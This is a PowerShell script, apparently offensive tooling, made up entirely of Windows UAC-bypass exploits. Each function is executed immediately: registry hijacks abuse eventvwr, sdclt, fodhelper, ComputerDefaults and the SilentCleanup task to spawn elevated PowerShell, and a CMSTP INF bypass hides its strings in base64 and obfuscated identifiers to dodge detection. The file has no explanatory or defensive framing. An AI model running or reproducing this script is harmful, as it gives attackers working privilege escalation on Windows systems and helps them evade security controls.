function Invoke-EventVwr {
    New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
    Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "powershell.exe" -Force
    Start-Process "C:\Windows\System32\eventvwr.msc"
    Start-Sleep -s 3
    Remove-Item -Path "HKCU:\Software\Classes\mscfile" -Recurse -Force -ErrorAction Ignore
}
Invoke-EventVwr

function Invoke-SdcltDelegateExecute {
    New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value "powershell"
    New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
    Start-Process -FilePath $env:windir\system32\sdclt.exe
    Start-Sleep -s 3
    Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
}
Invoke-SdcltDelegateExecute

function Invoke-FodHelperDelegateExecute {
    New-Item -Force -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Value "powershell"
    New-ItemProperty -Force -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute"
    Start-Process -FilePath $env:windir\system32\FodHelper.exe
    Start-Sleep -s 3
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction Ignore
}
Invoke-FodHelperDelegateExecute

function Invoke-ComputerDefaultsDelegateExecute {
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
    New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell" -Force
    Start-Process "C:\Windows\System32\ComputerDefaults.exe"
    Start-Sleep -s 2
    Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
}
Invoke-ComputerDefaultsDelegateExecute

function Invoke-SilentCleanup {
    New-ItemProperty "HKCU:\Environment" -Name "windir" -Value "cmd /c start powershell" -Force
    Start-Sleep -s 2
    schtasks.exe /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
    Start-Sleep -s 3
    Remove-Item "HKCU:\Environment\windir" -force -Recurse -ErrorAction Ignore
}
Invoke-SilentCleanup

function Invoke-uaccmstp
{
param(
        [String]
        $BinFile
    )
Function script:Set-INFFile {
  [CmdletBinding()]
  Param (
    [Parameter(HelpMessage="Specify the INF file location")]
    $InfFileLocation = "$env:temp\CMSTP.inf",
    [Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
    [String]$CommandToExecute = "$BinFile"
  )
  $FileContent = @"
[version]
Signature=`$chicago`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Commands Here will be run Before Setup Begins to install
$CommandToExecute
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="AdobeTest"
ShortSvcName="AdobeTest"

"@

 $FileContent | Out-File $InfFileLocation -Encoding ASCII
}
Function _10101001100101010
{
  [CmdletBinding()]
  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
  )
  Process
    {
        $ErrorActionPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcAA=')))
        Try 
        {
            ${01111111111111010} = ps -Name $ProcessName | select -ExpandProperty MainWindowHandle
        }
        Catch 
        {
            ${01111111111111010} = $null
        }
        ${00110101100000010} = @{
        ProcessName = $ProcessName
        Hwnd        = ${01111111111111010}
        }
    New-Object -TypeName PsObject -Property ${00110101100000010}
    }
}
function _00111011101011101
{
  [CmdletBinding()]
  Param
  (
    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
  )
  Process
  {
    ${01001011100001101} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFMAaABvAHcAVwBpAG4AZABvAHcAKABJAG4AdABQAHQAcgAgAGgAVwBuAGQALAAgAGkAbgB0ACAAbgBDAG0AZABTAGgAbwB3ACkAOwANAAoAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFMAZQB0AEYAbwByAGUAZwByAG8AdQBuAGQAVwBpAG4AZABvAHcAKABJAG4AdABQAHQAcgAgAGgAVwBuAGQAKQA7AA0ACgA=')))
    Add-Type -MemberDefinition ${01001011100001101} -Name Api -Namespace User32
    ${01111111111111010} = _10101001100101010 -ProcessName $Name | select -ExpandProperty Hwnd
    If (${01111111111111010}) 
    {
      ${10111011011001001} = New-Object -TypeName System.IntPtr -ArgumentList (0)
      [User32.Api]::SetForegroundWindow(${01111111111111010})
      [User32.Api]::ShowWindow(${01111111111111010}, 5)
    }
    Else 
    {
      [string] ${01111111111111010} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgAvAEEA')))
    }
    ${00110101100000010} = @{
      Process = $Name
      Hwnd    = ${01111111111111010}
    }
    New-Object -TypeName PsObject -Property ${00110101100000010}
  }
}
. Set-INFFile
add-type -AssemblyName System.Windows.Forms
If (Test-Path $InfFileLocation) {
  ${10100001000001001} = new-object system.diagnostics.processstartinfo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbQBzAHQAcAAuAGUAeABlAA==')))
  ${10100001000001001}.Arguments = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBhAHUAIAAkAEkAbgBmAEYAaQBsAGUATABvAGMAYQB0AGkAbwBuAA==')))
  ${10100001000001001}.UseShellExecute = $false
  [system.diagnostics.process]::Start(${10100001000001001})
  do
  {
  }
  until ((_00111011101011101 cmstp).Hwnd -ne 0)
  _00111011101011101 cmstp
  [System.Windows.Forms.SendKeys]::SendWait($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewBFAE4AVABFAFIAfQA='))))
}
}
Invoke-uaccmstp powershell